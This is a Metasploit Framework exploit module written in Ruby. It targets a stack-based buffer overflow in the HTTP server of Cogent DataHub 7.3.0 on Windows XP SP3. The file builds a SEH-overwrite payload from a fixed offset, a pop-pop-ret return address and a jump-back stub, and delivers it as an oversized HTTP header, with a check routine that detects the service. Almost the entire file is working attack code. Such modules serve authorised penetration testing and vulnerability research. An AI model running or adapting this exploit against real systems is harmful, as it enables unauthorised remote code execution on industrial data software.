# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require &#039;msf/core&#039;

class Metasploit3 < Msf::Exploit::Remote
  Rank = NormalRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::Remote::Seh

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;           => &#039;Cogent DataHub HTTP Server Buffer Overflow&#039;,
      &#039;Description&#039;    => %q{
        This module exploits a stack based buffer overflow on Cogent DataHub 7.3.0. The
        vulnerability exists in the HTTP server - while handling HTTP headers, a
        strncpy() function is used in a dangerous way. This module has been tested
        successfully on Cogent DataHub 7.3.0 (Demo) on Windows XP SP3.
      },
      &#039;Author&#039;         =>
        [
          &#039;rgod <rgod[at]autistici.org>&#039;,  # Vulnerability discovery
          &#039;juan vazquez&#039;, # Metasploit module
        ],
      &#039;License&#039;        => MSF_LICENSE,
      &#039;References&#039;     =>
        [
          [ &#039;OSVDB&#039;, &#039;95819&#039;],
          [ &#039;BID&#039;, &#039;53455&#039;],
          [ &#039;URL&#039;, &#039;http://www.zerodayinitiative.com/advisories/ZDI-13-178&#039; ],
          [ &#039;URL&#039;, &#039;http://www.cogentdatahub.com/Info/130712_ZDI-CAN-1915_Response.html&#039;]
        ],
      &#039;DefaultOptions&#039; =>
        {
          &#039;EXITFUNC&#039; => &#039;process&#039;,
        },
      &#039;Privileged&#039;     => false,
      &#039;Payload&#039;        =>
        {
          &#039;Space&#039;       => 33692,
          &#039;DisableNops&#039; => true,
          &#039;BadChars&#039;    => "\x00\x0d\x0a\x3a"
        },
      &#039;Platform&#039;       => &#039;win&#039;,
      &#039;Targets&#039;        =>
        [
          # Tested with the Cogent DataHub 7.3.0 Demo
          # CogentDataHubV7.exe 7.3.0.70
          [&#039;Windows XP SP3 English / Cogent DataHub 7.3.0&#039;,
            {
              &#039;Ret&#039;         => 0x7ffc070e, # ppr # from NLS tables # Tested stable over Windows XP SP3 updates
              &#039;Offset&#039;      => 33692,
              &#039;CrashLength&#039; => 4000 # In order to ensure crash before the stack cookie check
            }
          ],
        ],
      &#039;DefaultTarget&#039;  => 0,
      &#039;DisclosureDate&#039; => &#039;Jul 26 2013&#039;
    ))

  end

  def check
    res = send_request_cgi({
      &#039;uri&#039;          => "/datahub.asp",
      &#039;method&#039;       => &#039;GET&#039;,
    })

    if res and res.code == 200 and res.body =~ /<title>DataHub - Web Data Browser<\/title>/
      return Exploit::CheckCode::Detected
    end

    return Exploit::CheckCode::Safe
  end

  def exploit
    print_status("Trying target #{target.name}...")

    off = target[&#039;Offset&#039;] + 8 # 8 => length of the seh_record
    bof = payload.encoded
    bof << rand_text_alpha(target[&#039;Offset&#039;] - payload.encoded.length)
    bof << generate_seh_record(target.ret)
    bof << Metasm::Shellcode.assemble(Metasm::Ia32.new, "jmp $-" + off.to_s).encode_string
    bof << rand_text(target[&#039;CrashLength&#039;])

    print_status("Sending request to #{rhost}:#{rport}")

    send_request_cgi({
      &#039;uri&#039;          => "/",
      &#039;method&#039;       => &#039;GET&#039;,
      &#039;raw_headers&#039;  => "#{bof}: #{rand_text_alpha(20 + rand(20))}\r\n"
    })

  end
end

